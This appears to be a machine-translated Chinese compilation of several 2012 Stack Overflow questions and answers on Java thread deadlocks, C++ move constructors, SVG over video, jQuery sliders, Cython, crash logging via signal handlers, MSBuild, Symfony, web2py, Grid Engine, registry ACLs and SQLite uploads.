> 时间：2012-04-11T22:10:45.707
> 
> 标签：java, multithreading, blocking

我正在测试一个 Java 多线程示例代码，但是在 qB.start() 的 for 循环中启动的线程被阻止，因为它正在等待 qB 监视器的进入。这种堵塞的原因是什么？

谢谢你。

```
import java.util.*;

class QA {

public synchronized void open() throws Exception {

    Thread o = new Thread() {

        public void run() {

            QB qB = new QB();

            qB.start();
        }
    };

    o.start();
}

public static void main(String args[]) throws Exception {

    new QA().open();
}

public class QB {

private boolean shutdown;
private Vector<Thread> tList;
private final Object waitingLock = new Object();

public QB() {

    tList = new Vector<Thread>();
}

public synchronized void start() {

    for(int i = 0; i < 1; i++) {

        final int id = i;

        Thread t = new Thread("Thread " + id) {

            public void run() {

                load(id);
            }
        };

        tList.add(i, t);

        t.start();

    }

    tMonitor();
    waitUntilFinished();
}

private void tMonitor() {

    Thread cmt = new Thread("T Monitor Thread") {

        public void run() {

            synchronized(waitingLock) {

                while(tList.size() > 0) {

                    try {

                        sleep(10000);

                    } catch(Exception e) {

                        e.printStackTrace();
                    }
                }

                waitingLock.notifyAll();
            }
        }
    };

    cmt.start();
}

private void waitUntilFinished() {

    synchronized(waitingLock) {

        while(!isShutDown()) {

            try {

                waitingLock.wait();

            } catch(Exception e) {

        e.printStackTrace();
            }
        }
    }

}

private synchronized void load(int id) {

    try {

        System.out.println("blocked here");

// some work done here

removeFromTList(id);

    } catch(Exception e) {

        e.printStackTrace();
    }
}

public synchronized boolean isShutDown() {

    return shutdown;
}
}
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T22:32:08.943

我看到的第一个问题`QB#start()`是在`QB`. `t`在您尝试生成的线程内部，`load(id)`也在`QB`. 因此，当您调用线程块时，直到`t.start()`完成。`t``QB#start()`

据推测，在`QB#start()`方法结束时，`QB#waitUntilFinished()`应该等待所有`t`线程完成，但它们甚至无法进入`QB#load`方法，因为它们仍在等待`QB#start()`方法释放`QB`实例上的锁。

所以，循环僵局。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T22:15:09.210

**编辑：**

好的，现在我们`tList`已经完全揭示了如何从错误中删除线程。

如果索引 0 线程首先完成，则它将自己从列表中删除。这意味着当索引 1 线程完成时，它将从第 1 个位置移除`Vector`但不再指向自身。它正在删除#2 线程。当删除发生时，您迟早会遇到异常，因为它将删除无效索引。

您需要从`Vector`按地址而不是按位置删除项目：

```
 tList.remove(this); 
```

这将从列表中删除当前线程。您还应该在开始循环中执行 an`add(t)`而不是 an ：`add(i t)`

```
 tList.add(t); 
```

您现在根本不需要将 id 位置传递到您的线程中。

* * *

我看不到您从`tList`. 我看到了一个方法的定义（不是你编辑了你的 OP），`removeFromTList()`但我没有看到它在任何地方使用。在`tMonitor`你在这里的一个while循环中：

```
 while(tList.size() > 0) {
            try {
                sleep(10000);
            } catch(Exception e) {
                e.printStackTrace();
            }
        }
        // you never get to this line 
        waitingLock.notifyAll(); 
```

但我没有看到任何从列表中删除线程的内容。也许当每个线程完成时，它们应该自行移除？

如果`tMonitor`线程永远不会退出该循环，那么它永远不会调用：

```
waitingLock.notifyAll(); 
```

所以主线程将永远挂在`waitUntilFinished();`.

```
synchronized(waitingLock) {
    while(!isShutDown()) {
        try {
            waitingLock.wait();
        } catch(Exception e) {
            e.printStackTrace();
        }
    } 
```

此外，你不想做一个`sleep`in`tMonitor()`因为你在一个`synchronized`街区。你应该做一个：

```
 waitingLock.wait(10000); 
```

什么都不会通知它，但在睡眠中保持这样的锁是不好的形式。

# c++ - 移动构造函数和多重继承

> ID：10114701
> 
> 赞同：18
> 
> 时间：2012-04-11T22:11:25.777
> 
> 标签：c++, c++11, multiple-inheritance, move-semantics, move-constructor

## 概要

当类使用多重继承时，如何安全地设计移动构造函数？

## 细节

考虑以下场景：

```
struct T { };
struct U { };

struct X : public T, public U
{
    X(X&& other)
      : T(std::move(other))
      , U(std::move(other)) // already moved?!
    {
    }
}; 
```

有没有办法既安全`T`又`U`安全地移动建造？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-11T22:13:59.990

**tl;博士**：问题中的代码没问题。

上面的代码很好，因为`std::move`它本身实际上并没有`other`以任何方式改变，它只是进行了一次强制转换以`other`形成一个右值引用，以便调用 and 的移动构造函数`T`而`U`不是它们的复制构造函数。

`T(std::move(other))`运行时，将`T`调用 的 move 构造函数（假设它有一个），并且`T`in`other`将移动到`T`in `this`。在运行之前，`U`in`other`将被单独放置`U(std::move(other))`。

请注意，这意味着当您的移动构造函数代码`X`运行时，您不能依赖`T`和`U`in的成员/成员函数`other`，因为这些位`other`已经被移动了。

* * *

作为旁注，它可以通过更改为来改进：

```
X(X&& other)
  : T(std::move(static_cast<T&>(other)))
  , U(std::move(static_cast<U&>(other)))
{
} 
```

因为这个版本不依赖于`X&&`to `T&&`/的隐式向上转换`U&&`。依赖隐式向上转换可能是一个问题，因为`T`和/或`U`可能有一个`T(X&&)`构造函数或一个接受任何模板构造函数，它们中的任何一个都会被选中，而不是`T(T&&)`你真正想要调用的移动构造函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-12-07T15:26:00.403

正如@je4d 的回答所解释的那样，问题中的代码很好。

你也可以这样写：

```
X(X&& other)
  : T(static_cast<T&&>(other))
  , U(static_cast<T&&>(other))
{
} 
```

请参阅@jead 的答案评论以获取解释。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2022-02-08T15:13:48.673

使用移动后，我可以在侧音构造函数主体中使用其他对象吗：

```
struct T { };
struct U { };

struct X : public T, public U
{
    X(X&& other)
      : T(std::move(other))
      , U(std::move(other)) // already moved?!
    {
    member1 = other.member1; //something like. 

    }
}; 
```

# html - 如何使用 SVG 在 HTML5 视频上绘制形状？

> ID：10114703
> 
> 赞同：4
> 
> 时间：2012-04-11T22:11:38.897
> 
> 标签：html, svg, html5-video

我正在尝试在 HTML5 视频上绘制形状，但无法弄清楚如何去做。我知道如何在视频顶部应用蒙版：

```
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>SVG Test</title>
    </head>
    <body>
        <video class="target1" height="270px" width="480px" controls >
            <source src="testVideo.webm" type="video/webm" />
        </video>

        <!-- Apply a mask to the video -->
        <style>
            .target1 { mask: url("#mask1"); }
        </style>

        <!-- Define the mask with SVG -->
        <svg xmlns="http://www.w3.org/2000/svg" version="1.1"
                width="480px" height="270px">
            <defs>
                <mask id="mask1" maskUnits="objectBoundingBox" 
                        maskContentUnits="objectBoundingBox">
                    <circle cx="0.25" cy="0.25" r="0.5" fill="white" />
                </mask>
            </defs>
        </svg>
    </body>
</html> 
```

但是我该怎么做，比如在视频顶部画一条折线？

```
<polyline id="line" points="0,0 25,25, 25,50 75,50 100,100, 125,125"
     style="fill:none;stroke:orange;stroke-width:3" /> 
```

我可以在页面的其他地方画线，如下所示：

```
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>SVG Test</title>
    </head>
    <body>
        <video class="target1" height="270px" width="480px" controls >
            <source src="testVideo.webm" type="video/webm" />
        </video>

        <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1200px" height="700px">
            <polyline id="line" points="0,0 25,25, 25,50 75,50 100,100, 125,125"
                style="fill:none;stroke:orange;stroke-width:3" />
        </svg>
    </body>
</html> 
```

但我只是不知道如何在视频顶部放置线条。任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-12T12:59:57.210

是的，CSS 解决方案是一种选择。尝试将这两个元素放在一个 div 或（如 jörn 指出的）绝对定位中。z-index 非常有用，可以确保您的 svg 确实位于顶部。

```
<div id="canvas">
    <video id="videoContainer"> (...) </video>

    <svg id="svgContainer"> (...) </svg>
</div>

<style> 
   canvas{ position:relative; width:480px; height:240px; }
   videoContainer{ position:relative; width:100%; height:100%; z-index:1 }
   svgContainer{ position:relative; width:100%; height:100%; z-index:2 }
</style> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T09:04:26.350

使用 CSS position:absolute 将您的 SVG 定位在您想要的位置。

```
<style> svg { position:absolute; top:20px; left:40px; }</style> 
```

上面的示例应该将 svg 放置在距页面顶部 20 像素和距左侧 40 像素的位置

# jquery - 创建这样的滑块？

> ID：10114708
> 
> 赞同：0
> 
> 时间：2012-04-11T22:12:35.947
> 
> 标签：jquery, html

我不确定这叫什么，所以我无法搜索它，但如果你转到[http://vps.net/product/cloud-servers/](http://vps.net/product/cloud-servers/)并向下滚动到 VPS 节点，它是如何创建的？有什么教程或任何我可以看的吗？这是一个什么样的滑块？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T22:25:24.863

他们正在使用一个 jQuery-UI 滑块，带有一个自定义的回调，突出显示小节点框：

```
$('#slider').slider({
    range: "max",
    min: 1,
    max: 15,
    step: 1,
    slide: function(event, ui) {
        // Un-highlight nodes
        $('.node').removeClass('highlight');
        // Highlight all nodes up to value selected
        $('.node:lt('+ui.value+')').addClass("highlight");
    }
}); 
```

这是我的示例代码，我不想解析他们的混淆代码来查看他们实际为回调做了什么。这可能与此非常相似。

演示：http: [//jsfiddle.net/jtbowden/A8ccw/1/](http://jsfiddle.net/jtbowden/A8ccw/1/)

如果将`step`值更改为小数值，例如`.01`，则可以摆脱步进行为，然后使用`Math.floor()`来确定突出显示索引。

演示：http: [//jsfiddle.net/jtbowden/A8ccw/4/](http://jsfiddle.net/jtbowden/A8ccw/4/)

这是一个更新多个数据字段的演示：

演示：http: [//jsfiddle.net/jtbowden/A8ccw/8/](http://jsfiddle.net/jtbowden/A8ccw/8/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T22:15:54.750

您可以使用 jquery ui 滑块执行此操作：http: [//jqueryui.com/demos/slider/](http://jqueryui.com/demos/slider/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T22:44:33.557

也看看[http://egorkhmelev.github.com/jslider/](http://egorkhmelev.github.com/jslider/)

# c++ - 如何使用 Cython 保持 C++ 类名不被修改？

> ID：10114710
> 
> 赞同：18
> 
> 时间：2012-04-11T22:12:43.183
> 
> 标签：c++, python, cython

我有一个名为 Foo 的 C++ 类。如果我遵循[Cython C++ 教程](http://docs.cython.org/src/userguide/wrapping_CPlusPlus.html)，我将需要以不同的方式调用 Python 类，例如 PyFoo。但是我真的也需要调用 Python 类 Foo 。如何有效地做到这一点？

编辑：我正在尝试连接以前与 Boost Python 连接的现有 C++ 库。出于不同的原因，我想改为测试 Cython。由于使用 Boost:Python Python 类的名称与 C++ 中的名称相同，因此我想继续使用此命名约定。以不同的方式调用类并不是 Python (CPython) 的要求，但它似乎是 Cython 强加的，至少在本教程中是这样。

我当然可以使用纯 python 模块来定义一个调用 PyFoo 的 Foo 类，但这看起来既无聊又低效。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-04-12T09:50:12.773

有两种方法可以处理这个问题。

1.  用备用名称声明 C++ 类；原始名称必须用双引号指定：

    ```
    cdef extern from "defs.h" namespace "myns":
        cdef cppclass CMyClass "myns::MyClass":
            ... 
    ```

    然后您可以使用`MyClass`您的 python 类并将 C++ 声明称为`CMyClass`.

    请注意，原始名称必须明确包含命名空间（如果它是命名空间）。Cython 模板参数（如果存在）应该在备用名称声明之后。

2.  在一个单独的文件中声明您的 C++ 类，该`.pxd`文件的名称与您的`.pyx`文件不同，然后使用`cimport`.

    在 cpp_defs.pxd 中：

    ```
    cdef extern from "defs.h" namespace "myns":
        cdef cppclass MyClass:
            ... 
    ```

    在 py_wrapper.pyx 中：

    ```
    cimport cpp_defs as cpp

    cdef class MyClass:
        cpp.MyClass *_obj 
    ```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-06-18T19:48:52.397

这是一个展示 Nikita 方法的完整示例：

```
cdef extern from "floorplan_geometry.h" namespace "flyby::localize":
    cdef cppclass CFloorplan "flyby::localize::Floorplan":
        int xmin()

cdef class Floorplan:
    cdef CFloorplan* obj_
    def __cinit__(self):
        self.obj_ = new CFloorplan()
    def __dealloc__(self):
        del self.obj_
    def xmin(self):
        return self.obj_.xmin() 
```

# c++ - 在 Linux 上使用 C++ 记录进程终止的原因

> ID：10114711
> 
> 赞同：1
> 
> 时间：2012-04-11T22:12:46.860
> 
> 标签：c++, linux, logging, handle, terminate

有没有办法记录、处理或以其他方式留下一些关于进程为何终止的线索，涵盖尽可能多的导致终止的事件？

我的应用程序有一个日志记录工具，每分钟记录许多消息。我几乎在一个超级 try-catch 块中运行整个程序，所以我可以记录任何未处理的异常。我最近还尝试为可能终止进程的各种进程信号注册处理程序。然而，该应用程序仍然每天崩溃几次，我不知道为什么。

我可能无法记录或处理多少其他致命事件？我希望有一种正确的方法可以做到这一点，而不是在进程因我尚未意识到的某种新型事件而终止时一直处于黑暗之中。

非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:40:46.957

您可以注册一个函数来处理意外异常：

[set_unexpected()](http://msdn.microsoft.com/en-us/library/7twc8dwy%28v=vs.80%29.aspx)

如果不是，delt 将导致应用程序调用 terminat()。

您可以注册一个函数来记录终止时的内容：

[set_terminate()](http://msdn.microsoft.com/en-us/library/aa272914%28v=vs.60%29.aspx)

您可以添加自己的[atexit()](http://msdn.microsoft.com/en-us/library/tze57ck3%28v=vs.80%29.aspx)日志函数来执行某些操作（设置一个标志，以便它仅在退出异常发生时才执行某些操作，然后在离开 main 之前设置该标志）。

信号处理程序可能很棘手（特别是如果您希望它们是可移植的）。如果您使用它们，那么您在内部可以安全地做的事情是有限的，所以我通常限制自己设置一个全局标志，以便它们可以由普通代码处理（当然，如果您要终止，那么这是非常有限的）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-12T06:46:27.347

这是我在我的程序中使用的，它对我有用....每当我的程序崩溃时，它会将崩溃站点的堆栈跟踪打印到标准输出（可能被重定向到文件等，您可以稍后阅读它）。

请注意，您可能需要在 Makefile 的 CXXFLAGS 和/或 LFLAGS 中将 -rdynamic 作为标志传递，以确保堆栈跟踪包含人类可读的函数名称。

```
#include <stdio.h>
#include <signal.h>
#include <execinfo.h>

void PrintStackTrace()
{
   void *array[256];
   size_t size = backtrace(array, 256);
   char ** strings = backtrace_symbols(array, 256);
   if (strings)
   {
      printf("--Stack trace follows (%zd frames):\n", size);
      for (size_t i = 0; i < size; i++) printf("  %s\n", strings[i]);
      printf("--End Stack trace\n");
      free(strings);
   }
   else printf("PrintStackTrace:  Error, could not generate stack trace!\n");
}

static void CrashSignalHandler(int sig)
{
   // Uninstall this handler, to avoid the possibility of an infinite regress
   signal(SIGSEGV, SIG_DFL);
   signal(SIGBUS,  SIG_DFL);
   signal(SIGILL,  SIG_DFL);
   signal(SIGABRT, SIG_DFL);
   signal(SIGFPE,  SIG_DFL);

   printf("CrashSignalHandler called with signal %i... I'm going to print a stack trace, then kill the process.\n", sig);
   PrintStackTrace();
   printf("Crashed process aborting now.... bye!\n");
   fflush(stdout);
   abort();
}

int main(int argc, char ** argv)
{
   signal(SIGSEGV, CrashSignalHandler);
   signal(SIGBUS,  CrashSignalHandler);
   signal(SIGILL,  CrashSignalHandler);
   signal(SIGABRT, CrashSignalHandler);
   signal(SIGFPE,  CrashSignalHandler);

   [...remainder of your program goes here...]
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-11T22:19:38.163

拥有一个超级`try/catch`块意味着可捕获的异常不会未处理。请注意，所有启动的线程都需要这些块。

除此之外，您可以使用它[`signal`](http://www.cplusplus.com/reference/clibrary/csignal/signal/)来捕获终止信号。这些是：

*   SIGABRT (Signal Abort) 异常终止，例如由 abort 函数启动。
*   SIGFPE（信号浮点异常）错误的算术运算，例如零除或导致溢出的运算（不一定使用浮点运算）。
*   SIGILL (Signal Illegal Instruction) 无效的函数映像，例如非法指令。这通常是由于代码损坏或尝试执行数据所致。
*   SIGINT（信号中断）交互式注意信号。一般由应用用户生成。
*   SIGSEGV（信号分段违规）对存储的无效访问：当程序试图在分配给它的内存之外读取或写入时。SIGTERM（信号终止）发送到程序的终止请求。
*   由实现定义的信号，但大多数崩溃原因都应包含在这些信号中。

**此外**，可能是程序没有崩溃，而是通过从 main 返回（但我猜你已经涵盖了）或通过调用来终止`exit`。在这种情况下，您可以检查程序的返回值并将其记录下来。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T22:40:49.253

一个代码胜过许多话：

```
#include <iostream>
#include <signal.h>

sigint_handler(int s) {
    std::cout<<"signal caught: "<<s<<std::endl;
    ::exit(-1);
}

void setup_signal() {
    struct sigaction sigIntHandler;
    sigIntHandler.sa_handler = sigint_handler;
    sigemptyset(&sigIntHandler.sa_mask);
    sigIntHandler.sa_flags = 0;
    sigaction(SIGINT, &sigIntHandler, NULL);
    sigaction(SIGTERM, &sigIntHandler, NULL);
}

int main() {
    setup_signal();
    /* do stuff */
    return 0;
} 
```

当然，这只处理 SIGINT/SIGTERM 信号。您还必须使用所有 atexit()、set_terminate、超级 try/catch 等更新此代码。您可以找到。万一你遇到段错误/总线错误/无论如何......你注定要失败:)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-12T06:29:14.943

看看这个问题。 [如何在 unix 上找到没有日志文件的死进程的原因？](https://stackoverflow.com/questions/7911965/how-to-find-the-reason-for-a-dead-process-without-log-file-on-unix/7912400#7912400)

在那里您将看到使用 bash 获取进程的退出代码比使用信号处理程序或任何类型的退出回调要**容易得多。**

# msbuild - MSBuild 复制命令的详细程度

> ID：10114713
> 
> 赞同：9
> 
> 时间：2012-04-11T22:12:54.410
> 
> 标签：msbuild, msbuild-task

在 MSBuild 任务中，您可以设置整体详细程度，但我真正想做的只是设置“复制”命令的详细程度。它会为它在“正常”详细设置中复制的每个文件打印一行，在我的例子中是数千行过于详细的行。

[我在Copy](http://msdn.microsoft.com/en-us/library/3e54c37h.aspx)任务中没有看到任何有关此类属性的文档，所以我想知道是否还有其他方法......或者人们是否只是放弃内置的复制任务并使用带有自己标志的 robocopy。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T07:25:41.110

您可以编写自己的构建记录器。将复制任务添加到特定目标并过滤来自该特定目标的构建消息。

[这是自定义记录器的好例子](http://msdn.microsoft.com/en-us/library/microsoft.build.framework.loggerverbosity.aspx)。
您必须将 /logger 参数与您的自定义记录器一起传递给 MSBuild 命令行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T14:18:02.357

您可以编写自己的 Copy 任务，添加一个可选的 Verbosity 参数。

# php - Symfony 2 表单不保存来自选择的数据（在连接表上）

> ID：10114714
> 
> 赞同：0
> 
> 时间：2012-04-11T22:12:56.647
> 
> 标签：php, symfony, doctrine

我创建了一个看起来正确的表单，它有几个文本字段和一个选择框，其中包含从我拥有的国家/地区表中提取的国家/地区列表。选择框使用正确的“值”值正确显示并显示文本。但是，当我提交表单时，出现异常：

```
SQLSTATE[23000]: Integrity constraint violation: 1048 Column 'countryid' cannot be null 
```

如果我将数据库表（在 PHPMyAdmin 中）设置为允许 countryid 字段为空值，它会毫无例外地输入记录，但 countryid 的条目为空。

我的控制器有以下代码：

```
 $duck = new \Wfuk\DuckBundle\Entity\Ducks();

    $form = $this->createFormBuilder($duck)
       ->add('city', 'text')
       ->add('countryid', 'entity', array('class' => 'WfukDuckBundle:Country', 'property' => 'country'))
       // cut other fields
       ->getForm();

    if ($request->getMethod() == 'POST') {
        $form->bindRequest($request);

    $errors = $this->get('validator')->validate( $form );

    echo $duck->getCountryid();

    if ($form->isValid()) {
        $em = $this->getDoctrine()->getEntityManager();
        $em->persist($duck);
        $em->flush();
        return $this->redirect($this->generateUrl('upload_duck_success'));
        } 
```

那里的回声返回国家对象的 __toString 函数，这似乎有点奇怪 - 但它是表格中选择的国家的完整国家信息。

在 Ducks.php 类中：

```
 /**
 * @var string $countryid
 *
 * @ORM\Column(name="countryid", type="string", length=2, nullable=false)
 */
private $countryid;

/**
 * Set countryid
 *
 * @param string $countryId
 */
public function setCountryid($countryid)
{
    $this->countryid = $countryid;
}

/**
 * Get countryid
 *
 * @return string 
 */
public function getCountryid()
{
    return $this->countryid;
} 
```

这是我的第一个 symfony 项目，但我已经看过文档好几次了，我认为我的一切都设置好了……

编辑：

我有一个加入设置如下：Ducks.php

```
/**
 * @ORM\ManyToOne(targetEntity="Country", inversedBy="ducks")
 * @ORM\JoinColumn(name="countryid", referencedColumnName="id")
 */
private $country;

/**
 * Set country
 *
 * @param string $country
 */
public function setCountry($country)
{
    $this->country = $country;
}

/**
 * Get country
 *
 * @return string 
 */
public function getCountry()
{
    return $this->country;
} 
```

在 Country.php 方面：

```
/**
 * @ORM\OneToMany(targetEntity="Ducks", mappedBy="country")
 */
protected $ducks;

public function __construct()
{
    $this->ducks = new ArrayCollection();
}

/**
 * Get ducks
 *
 * @return Doctrine\Common\Collections\Collection 
 */
public function getDucks()
{
    return $this->ducks;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-12T00:56:21.780

发生的事情是表单正在向鸭子发送一个实际的 Country 对象。您可以通过以下方式确认：

```
public function setCountryid($countryid)
{
    if (is_object($countryid)) die('Yep, got a country object.');
    $this->countryid = $countryid;
} 
```

听起来您只想存储 2 个字符的国家/地区代码？你不想要一个真正的关系？如果是这样，那么这可能会奏效：

```
public function setCountryid($countryid)
{
    if (is_object($countryid)) $countryid = $countryid->getId();
    $this->countryid = $countryid;
} 
```

如果你想在鸭子和国家之间建立一个真正正常的 Doctrine 管理关系，那么就像：

```
/**
 * @ORM\ManyToOne(targetEntity="Country")
 * @ORM\JoinColumn(name="country_id", referencedColumnName="id")
 */
 */
private $country; 
```

并相应地调整你的 getter/setter。

您似乎同时拥有 yml 和注释，这有点奇怪。据我了解，您可以在给定的捆绑包中使用其中一个。

# python - 使用 web2py 模拟输入的 HTML5 模式属性的行为？

> ID：10114715
> 
> 赞同：1
> 
> 时间：2012-04-11T22:12:58.697
> 
> 标签：python, html, web2py, web2py-modules

我希望使用 HTML5 和模式属性验证我的所有表单，但与往常一样，互联网上没有什么是完美的，我仍然需要备份来捕捉那些不使用 HTML5 友好浏览器的用户。

我很难在手册中找到正则表达式的确切表示，所以如果你知道，我会很感激一些帮助。我以两种方式编写了代码，HTML 方式和 HTML 帮助程序方式（见下文），HTML5 可以在除 IE 之外的现代浏览器中正常工作和验证，但我无法将它们转换为 python。

您将在下面看到一个示例，表达式`pattern="[A-F0-9]{11}|[A-F0-9]{14}"` 这有效地强制输入仅包含大写字母 AF 和数字 0-9。它还确保长度正好是 11 个字符或 14 个字符。那么我将如何在 web2py 中使用它呢？IS_LENGTH 似乎只接受我的测试范围，到目前为止，我只发现`IS_ALPHANUMERIC`可以控制接受哪些字符。

请看下面的表格：

HTML：

```
<form id="activate_form" method="post" action="">
    <label for="meid">MSIE/ESN <sup>*</sup></label>
    <input name="meid" pattern="[A-Fa-f0-9]{11}|[A-Fa-f0-9]{14}" placeholder="MEID/ESN" required />
    <br />
    <label for="zip">Zip Code <sup>*</sup></label>
    <input type="number" name="zip" pattern="{5}" placeholder="Zip Code" required />
    <br />
    <br />
    <br /><br />
    <input type="button" name="cancel" value="Cancel" onClick="history.go(-1);return true;" />
    <input type="submit" name="submit" value="Activate" />
       <p class="small"><sup>*</sup> denotes a required field.
</form> 
```

HTML 助手：

```
form=FORM(LABEL('MEID/ESN ',(SPAN('*'))),INPUT(_name='meid',_pattern="[A-F0-9]{11}|[A-F0-9]{14}",_placeholder='MEID/ESN',_required='required',_title="The MEID/ESN number only contains 11 or 13 characters, the letters A-F, and the numbers 0-9.",requires=[IS_LENGTH(11|14),IS_NOT_EMPTY()], _onblur="this.checkValidity();"),BR(),LABEL('ZIP CODE ',(SPAN('*'))),INPUT(_name='zip',_type='number',_pattern="[0-9]{5}",_placeholder='Zip Code',_required='required',_title="We only required the five character zip code.",requires=IS_NOT_EMPTY()),BR(),BR(),BR(),BR(),INPUT(_type='button',_name='cancel',_value='Cancel',_onclick="history.go(-1);return true;"),INPUT(_type='submit',_name='submit',_value='Activate'),_method='post',_id='activate_form')
    if form.accepts(request,session):
        response.flash = 'Form accepted'
     #   redirect(URL('next'))
    elif form.errors:
        response.flash = 'Form has errors'
    return dict(form=form) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:55:49.400

如果您想坚持使用客户端验证，您还可以考虑使用 Javascript polyfill 库，例如[Webshims Lib](http://afarkas.github.com/webshim/demos/)，它可以让您在旧版浏览器中使用 HTML5 功能。另请注意，尽管客户端验证改善了用户体验，但它并不能防止恶意攻击，因此您可能还需要一些服务器端验证。

无论如何，对于服务器端模式验证，您可以使用`IS_MATCH()`验证器。例如：

```
IS_MATCH('[A-F0-9]{11}|[A-F0-9]{14}', strict=True) 
```

那将从字符串的开头匹配，设置`strict=True`也需要匹配字符串的结尾（相当于在正则表达式的末尾添加“$”）。如果您不想匹配字符串的开头，而是在字符串中的任何位置搜索模式，您可以设置`search=True`.

# sungridengine - 如何包装 qrsh？

> ID：10114716
> 
> 赞同：1
> 
> 时间：2012-04-11T22:13:05.500
> 
> 标签：sungridengine

我正在尝试为 qrsh（相当于 rsh 的 Oracle Grid Engine）编写一个包装器，但在识别给它的命令时遇到了麻烦。考虑以下示例：

```
qrsh -cwd -V -now n -b y -N cvs -verbose -q some.q -p -98 cvs -Q log -N -S -d2012-04-09 14:02:08 GMT<2012-04-11 21:53:41 GMT -b 
```

本例中的命令从 cvs 开始。我的包装器需要是通用的，所以我不能专门寻找 cvs。关于如何识别它的任何想法？一种想法是从末尾开始向后查找可执行命令，这在这种情况下可以工作，但不会很健壮，因为“cvs”可能出现在其自身的选项中。我能想到的唯一可靠的选项是完全实现 qrsh 选项解析器，但我对此并不感到兴奋，因为它需要使用 qrsh 更新进行更新并且很复杂。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:23:23.030

一种选择是将 QRSH_WRAPPER 设置为 echo 并运行 qrsh 一次。但是，这需要发布两个作业而不是一个，这增加了延迟并浪费了一个插槽。

# css - Jquery Image Bubble显示：内联块问题

> ID：10114717
> 
> 赞同：0
> 
> 时间：2012-04-11T22:13:10.283
> 
> 标签：css

以前，我试图确定如何在冒泡之前删除导致图像之间空间的填充。

display: inline-block 导致填充。建议让所有 li 标签一起运行来解决这个问题，但是，这是不可能的，因为我需要 li 标签，因为它们通常会出现在 html 文档中，而不是并排出现。

我已经评论了：显示：内联块，现在这会导致图像看起来堆叠在一起，当它们需要并排显示黄色容器的宽度时。

[http://jsfiddle.net/NinjaSk8ter/nvQEA/5/](http://jsfiddle.net/NinjaSk8ter/nvQEA/5/)

有人可以建议我应该修改什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:56:02.763

如果您指的是黄色框之间的空白，则需要将 li 标签一起运行。inline-block 声明导致了额外的间距。

```
 <li>stuff here</li><li>here is more
           stuff</li> 
```

# security - Windows 注册表中的安全性

> ID：10114718
> 
> 赞同：1
> 
> 时间：2012-04-11T22:13:18.620
> 
> 标签：security, registry, windows-mobile-6.5

任何程序都可以写入 Windows 注册表的任何部分吗？是否有防止这种情况发生的权限和机制？如果我有一个将键值写入注册表的程序，我可以禁止任何其他程序修改键值吗？

我使用的是 Windows Mobile 6，但这也可能是一般的 Windows 问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:16:35.273

Windows 注册表，至少在基于 NT 的系统上，支持访问控制，就像大多数其他对象（文件等）一样。因此，您可以在注册表项上设置适当的 ACL 以及限制访问的值。

我很确定 Windows Mobile 上不存在此功能，但它存在于 Windows NT、XP、2003、Vista、Win7 等上。

请参阅：http: [//msdn.microsoft.com/en-us/library/windows/desktop/ms724878%28v=vs.85%29.aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724878%28v=vs.85%29.aspx)

# php - 当一个 xml 文件在写入时试图被读取时会发生什么？

> ID：10114723
> 
> 赞同：0
> 
> 时间：2012-04-11T22:13:28.627
> 
> 标签：php, ios, xml

我有一个 iOS 应用程序，允许用户更新当地酒吧的保险费用。然后将数据显示在应用程序上供其他用户查看。通过向 php 脚本发送请求，然后脚本更新和 xml 文件来进行更新。如果一个用户试图读取 xml 而另一个用户正在更新它会发生什么，即当文件被新的更新重写时会发生什么？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:52:54.410

用户有 50-50 机会获得更新版本，具体取决于服务器速度和连接速度可能会有所不同。我同意 AMayer 的观点，一旦文件变大，您的服务器将很难一次又一次地下载和上传整个 xml 文件**！**我现在只需设置一个 MySQL 数据库并使用它而不是 XML。

# android - 将 SQLite db 发送到 Web 服务

> ID：10114725
> 
> 赞同：4
> 
> 时间：2012-04-11T22:13:47.913
> 
> 标签：android, sql-server, web-services, sqlite, networking

我有一个 android 应用程序，它填充了一个具有众多纬度和经度的 SQLite 数据库。然后我需要将该数据存储在外部 SQL Server 数据库中。我遇到的问题是将该文件发送到 Web 服务。我找不到任何关于类应该如何看待的示例，这些示例包含 db 文件并将其存储在单独的 SQL Server db 中。这甚至是我应该解决问题的方式吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T22:17:56.803

更好的方法是通过 Web 服务将实际的纬度/经度数据发送到 db，而不是发送整个 db 文件本身。

这样做可以完成几件事：

*   实现起来应该简单得多
*   您不需要在服务器端支持 SQLite，只需要在客户端
*   数据“设置”将立即可用于查询 - 而不是需要在使用之前从 SQLite db 文件中提取

**编辑：**您上传的频率和数量完全取决于您。您可以使其由用户激活或在某个时间间隔内以批量方式或一次一个方式上传最新数据，直到您获得最新数据。无论哪种情况，您都可以使用时间戳跟踪哪些数据需要上传。

